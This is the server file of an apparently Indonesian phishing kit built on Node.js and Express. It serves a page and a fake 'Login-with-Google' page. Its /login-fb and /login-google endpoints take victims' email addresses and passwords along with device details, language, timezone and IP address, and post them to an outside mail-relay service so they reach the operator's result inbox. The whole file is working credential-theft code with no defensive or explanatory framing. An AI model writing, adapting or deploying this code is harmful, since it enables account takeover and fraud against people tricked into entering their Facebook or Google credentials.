import dotenv from 'dotenv';
import express from 'express';
import path from 'path';
import fs from 'fs';
import { fileURLToPath } from 'url';
import requestIp from 'request-ip';
import axios from 'axios';
import { subjectFb, buildHtmlFb } from "./src/utils/mailFb.js";
import { subjectG, buildHtmlG } from "./src/utils/mailG.js";
dotenv.config();

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const app = express();
const port = process.env.PORT || 3000;
const data = JSON.parse(fs.readFileSync('./public/setting.json', 'utf-8'));
const emailRess = data.email.result;

app.use(express.json());
app.use(requestIp.mw());
app.use(express.static(path.join(__dirname, 'public')));
app.set('views', path.join(__dirname, 'src/views'));
app.set('view engine', 'ejs');

app.get('/', (req, res) => {
  res.render('index', {
    title: data.setting.title,
    name: data.setting.name,
    size: data.setting.size
    });
});

app.get('/Login-with-Google', (req, res) => {
  res.render('google');
});

app.post('/login-fb', async (req, res) => {
  const {
    logF,
    emailF,
    passF,
    model,
    platform,
    versi,
    lang,
    browser,
    connection,
    timez,
    date,
  } = req.body;

  const device = `${model} ${platform} ${versi}` || "Unknown";
  const ip = req.clientIp || "Unknown";
  
  try {
    await axios.post('https://sender-mail.vercel.app/api/mail', {
      to: emailRess,
      subject: subjectFb,
      html: buildHtmlFb({
        logF, emailF, passF, device,
        lang, browser, connection,
        timez, ip, date
      })
    });

    res.sendStatus(200);
    console.log(`\n📩 Result dikirim ke ${emailRess}`);

  } catch (err) {
    console.error('Gagal kirim email:', err.message);
    res.status(500).send('Failed to send data');
  }
});

app.post('/login-google', async (req, res) => {
  const {
    logG,
    emailG,
    passG,
    model,
    platform,
    versi,
    lang,
    browser,
    connection,
    timez,
    date,
  } = req.body;

  const device = `${model} ${platform} ${versi}` || "Unknown";
  const ip = req.clientIp || "Unknown";
  
  try {
    await axios.post('https://sender-mail.vercel.app/api/mail', {
      to: emailRess,
      subject: subjectG,
      html: buildHtmlG({
        logG, emailG, passG, device,
        lang, browser, connection,
        timez, ip, date
      })
    });

    res.sendStatus(200);
    console.log(`\n📩 Result dikirim ke ${emailRess}`);

  } catch (err) {
    console.error('Gagal kirim email:', err.message);
    res.status(500).send('Failed to send data');
  }
});

// 404
app.use((req, res) => {
  res.status(404).redirect('/');
});

// Error global
app.use((err, req, res, next) => {
  console.error(err.stack);
  res.status(500).send('Terjadi kesalahan server.');
});

// Start Server
app.listen(port, () => {
  console.log(`Server running on http://127.0.0.1:${port}`);
});